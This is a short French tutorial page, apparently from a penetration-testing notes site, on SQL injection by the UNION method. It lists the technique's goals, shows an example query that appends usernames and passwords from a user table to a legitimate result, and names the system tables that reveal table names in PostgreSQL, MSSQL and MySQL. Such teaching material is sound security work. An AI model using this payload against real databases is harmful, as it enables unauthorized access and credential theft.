# Injection de commandes SQL

## 1. Par méthode UNION

#### Les objectifs de cette techniques sont :

* Trouver le nombre et le type de chaque colonne retournée par la requête
* Trouver le nom d'une colonne et d'une table comportant des choses intéressantes \(Login, Password, etc.\)
* Utiliser une union pour récupérer les informations

```sql
select title, link from post_table
where id < 10
union
select username, password
from user_table; --;
```

{% hint style="info" %}
Pour une base PostgreSQL, la colonne tablename de la table **pg\_tables** va permettre de récupérer le nom des tables, pour MSSQL, select name from **SysObjects**, pour MySQL, select table\_name from **information\_schema.tables .**
{% endhint %}



